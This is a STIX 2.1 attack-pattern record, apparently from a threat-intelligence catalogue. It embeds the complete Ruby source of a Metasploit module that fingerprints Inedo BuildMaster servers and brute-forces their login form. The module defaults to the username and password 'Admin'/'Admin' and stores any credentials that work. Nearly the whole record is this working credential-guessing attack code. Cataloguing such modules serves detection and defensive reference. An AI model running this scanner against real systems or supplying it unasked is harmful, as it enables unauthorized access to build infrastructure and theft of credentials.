{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--925192c0-fccf-4d45-8f29-fae50b75eabc",
    "created": "2024-08-14T16:30:41.750535Z",
    "modified": "2024-08-14T16:30:41.750539Z",
    "name": "Inedo BuildMaster Login Scanner",
    "description": " This module will attempt to authenticate to BuildMaster. There is a default user 'Admin' which has the default password 'Admin'. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/buildmaster_login.rb",
            "external_id": "buildmaster_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Inedo BuildMaster Login Scanner',\n      'Description' => %{\n          This module will attempt to authenticate to BuildMaster. There is a default user 'Admin'\n          which has the default password 'Admin'.\n      },\n      'Author'         => [ 'James Otten <jamesotten1[at]gmail.com>' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'VERBOSE' => true })\n    )\n\n    register_options(\n      [\n        Opt::RPORT(81),\n        OptString.new('USERNAME', [false, 'Username to authenticate as', 'Admin']),\n        OptString.new('PASSWORD', [false, 'Password to authenticate with', 'Admin'])\n      ]\n    )\n  end\n\n  def run_host(ip)\n    return unless buildmaster?\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def buildmaster?\n    begin\n      res = send_request_cgi('uri' => '/log-in')\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{peer} - HTTP Connection Failed\")\n      return false\n    end\n\n    if res && res.code == 200 && res.body.include?('BuildMaster_Version')\n      version = res.body.scan(%r{<span id=\"BuildMaster_Version\">(.*)</span>}).flatten.first\n      print_good(\"#{peer} - Identified BuildMaster #{version}\")\n      return true\n    else\n      print_error(\"#{peer} - Application does not appear to be BuildMaster\")\n      return false\n    end\n  end\n\n  def login_succeeded?(res)\n    if res && res.code == 200\n      body = JSON.parse(res.body)\n      return body.key?('succeeded') && body['succeeded']\n    end\n    false\n  rescue\n    false\n  end\n\n  def do_login(user, pass)\n    print_status(\"#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n        {\n          'uri' => '/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.LogInPage/LogIn',\n          'method' => 'POST',\n          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },\n          'vars_post' =>\n            {\n              'userName' => user,\n              'password' => pass\n            }\n        }\n      )\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"#{peer} - HTTP Connection Failed...\")\n      return :abort\n    end\n\n    if login_succeeded?(res)\n      print_good(\"SUCCESSFUL LOGIN - #{peer} - #{user.inspect}:#{pass.inspect}\")\n      store_valid_credential(user: user, private: pass)\n    else\n      print_error(\"FAILED LOGIN - #{peer} - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n"
}